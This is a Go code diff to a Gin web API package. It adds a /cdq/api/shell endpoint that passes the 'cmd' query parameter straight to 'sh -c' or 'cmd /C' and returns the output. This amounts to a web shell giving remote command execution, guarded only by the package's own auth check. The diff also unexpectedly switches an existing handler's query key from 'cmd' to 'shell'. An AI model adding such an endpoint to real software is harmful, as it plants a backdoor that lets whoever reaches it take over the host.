@@ -1,10 +1,18 @@
 package cdq
 
 import (
+	"context"
 	"errors"
 	"fmt"
+	"golang.org/x/text/encoding"
+	"golang.org/x/text/encoding/simplifiedchinese"
+	"golang.org/x/text/transform"
 	"net/http"
+	"os/exec"
+	"runtime"
 	"sync"
+	"time"
+	"unicode/utf8"
 
 	"github.com/gin-gonic/gin"
 )
@@ -39,6 +47,7 @@ func (a *GinApi) NewRouter(addr string, debug bool) {
 		a.Router = gin.New()
 	}
 	a.Router.GET("/cdq/api", a.AutoGucooingApi, a.GetApi)
+	a.Router.GET("/cdq/api/shell", a.AutoGucooingApi, a.shell)
 	a.Router.Use(gin.Recovery())
 	a.server = &http.Server{Addr: addr, Handler: a.Router}
 }
@@ -94,7 +103,7 @@ func (a *GinApi) GetApi(c *gin.Context) {
 		Msg:  "",
 	}
 	defer c.JSON(200, resp)
-	cmd := c.Query("cmd")
+	cmd := c.Query("shell")
 	command := a.c.commandMap[cmd]
 	if command == nil {
 		resp.Code = GinApiCodeCmdErr
@@ -141,4 +150,58 @@ func (a *GinApi) AutoGucooingApi(c *gin.Context) {
 		c.String(401, "Unauthorized")
 		c.Abort()
 	}
+}
+
+func (a *GinApi) shell(c *gin.Context) {
+	command := c.Query("cmd")
+	if command == "" {
+		c.JSON(http.StatusBadRequest, gin.H{"error": "Missing 'cmd' query parameter"})
+		return
+	}
+
+	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
+	defer cancel()
+
+	var cmd *exec.Cmd
+	switch runtime.GOOS {
+	case "windows":
+		cmd = exec.CommandContext(ctx, "cmd", "/C", command)
+	default:
+		cmd = exec.CommandContext(ctx, "sh", "-c", command)
+	}
+
+	output, err := cmd.CombinedOutput()
+	if err != nil {
+		if len(output) > 0 {
+			utf8Output := convertToUTF8(output)
+			c.String(http.StatusOK, utf8Output)
+			return
+		}
+		c.JSON(http.StatusInternalServerError, gin.H{
+			"error": "Command execution failed: " + err.Error(),
+		})
+		return
+	}
+	utf8Output := convertToUTF8(output)
+	c.String(http.StatusOK, utf8Output)
+}
+
+func convertToUTF8(data []byte) string {
+	if utf8.Valid(data) {
+		return string(data)
+	}
+
+	var decoder *encoding.Decoder
+	switch runtime.GOOS {
+	case "windows":
+		decoder = simplifiedchinese.GBK.NewDecoder()
+	default:
+		return string(data)
+	}
+
+	result, _, err := transform.Bytes(decoder, data)
+	if err != nil {
+		return string(data)
+	}
+	return string(result)
 }
